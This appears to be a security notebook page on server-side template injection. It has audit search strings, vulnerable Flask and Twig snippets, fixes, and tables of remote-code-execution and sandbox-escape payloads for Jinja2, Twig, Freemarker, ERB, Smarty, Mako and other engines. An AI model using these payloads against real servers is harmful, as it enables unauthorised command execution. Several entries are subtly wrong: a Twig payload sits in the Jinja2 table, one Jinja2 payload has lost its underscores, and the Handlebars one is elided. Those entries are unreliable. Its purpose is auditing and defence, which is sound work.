# SSTI — Server-Side Template Injection

**Tags:** #critical #ssti #template #rce #injection
**OWASP:** A03:2021 Injection
**CVSS Base:** 9.8 (Critical — can achieve RCE)

---

## 📖 What it is

SSTI occurs when user input is rendered directly by a server-side template engine, allowing execution of arbitrary expressions — and in critical cases, full RCE.

---

## 🔍 `grep_search` Tactics

```
render_template_string(
Twig\Loader
Template(
new Smarty
erb.new
Environment().from_string(
jinja2.Template(
template.render(
```

---

## 🎯 Vulnerable Code Patterns

```python
#  VULNERABLE  Flask/Jinja2
from flask import render_template_string, request
@app.route('/greet')
def greet():
    name = request.args.get('name')
    return render_template_string(f"<h1>Hello {name}!</h1>")  # Direct input in template
```

```php
//  VULNERABLE  Twig
$twig = new Twig\Environment($loader);
echo $twig->createTemplate("Hello " . $_GET['name'])->render([]);
```

---

## 💣 Payloads by Engine

### 🐍 Jinja2 (Python / Flask)

| Stage | Payload | Expected Result |
|---|---|---|
| Detection | `{{7*7}}` | `49` |
| Detection | `{{7*'7'}}` | `7777777` |
| Info dump | `{{config}}` | Flask configuration |
| RCE | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | `uid=...` |
| Alternative RCE | `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` | `uid=...` |
| Filter bypass | `{{''.class.mro()[1].subclasses()[396]('id',shell=True,stdout=-1).communicate()[0]}}` | Command output |

| RCE | `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` | Output of `id` |

### 🛠️ Advanced Sandbox Escape (Jinja2)

If `__globals__` or `__builtins__` are blocked, use `__mro__` to climb the class hierarchy:
```python
# List all subclasses of 'object'
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Find index of subprocess.Popen or os._wrap_close and call it
{{ ''.__class__.__mro__[1].__subclasses__()[400]('id',shell=True,stdout=-1).communicate()[0] }}
```

### 🛠️ Advanced Sandbox Escape (Twig)

In Twig 1.x / 2.x, `_self.env.registerUndefinedFilterCallback` is the most powerful gadget:
```php
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
```
In Twig 3.x, this is partially mitigated, but check for custom extensions implementing binary filters without validation.

### ☕ Freemarker (Java)

| Stage | Payload | Expected Result |
|---|---|---|
| Detection | `${7*7}` | `49` |
| RCE | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | Output of `id` |

### 💎 ERB (Ruby on Rails)

| Stage | Payload | Expected Result |
|---|---|---|
| Detection | `<%= 7*7 %>` | `49` |
| RCE | `<%= \`id\` %>` | Output of `id` |

### 🧩 Smarty (PHP)

| Stage | Payload | Expected Result |
|---|---|---|
| Detection | `{$smarty.version}` | Smarty version |
| RCE | `{php}echo \`id\`;{/php}` | Output of `id` |

### 🟨 Handlebars (Node.js)

| Stage | Payload |
|---|---|
| Detection | `{{7*7}}` |
| RCE via Prototype Pollution | `{{#with "s" as |string|}}...{{/with}}` + proto chain |

### Mako (Python)
**Payload:** `${os.system('id')}`

### Cheetah (Python)
**Payload:** `$os.system('id')`

### Genshi (Python)
**Payload:** `<p py:content="os.system('id')">...</p>`

---

## 🧠 Engine Identification Algorithm

```
1. Observe the language/framework  identify the common template engine
2. Test {{7*7}}  if it returns 49: Jinja2, Twig, or Handlebars
3. Test ${7*7}  if it returns 49: Freemarker or Velocity
4. Test #{7*7}  if it returns 49: Thymeleaf
5. Test <%= 7*7 %>  if it returns 49: ERB
6. Negative payload: <%- 7*7 %>  EJS (Node.js)
```

---

## 🔗 Second-Order SSTI

> A template with `{{user.bio}}` renders the bio field from the database.
> If the bio was saved as `{{7*7}}` without sanitization, the template engine executes it on render.

```
Flow: POST /profile  bio = "{{config.__class__...}}"  saved to database
       GET /profile  template renders the bio  RCE
```

See: [[second-order-injection]]

---

## 🛡️ Fix

```python
#  CORRECT  Pass name as a variable, do not interpolate it into the template string
return render_template('greet.html', name=name)
```

```python
#  CORRECT  Sanitize the Jinja2 environment
from jinja2 import Environment, sandbox
env = sandbox.SandboxedEnvironment()
template = env.from_string("Hello {{ name }}")
return template.render(name=name)  # name is context, not eval'd as an expression
```

---

## 📌 References
- [[second-order-injection]]
- [[eip-exploratory-investigation-protocol]]
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)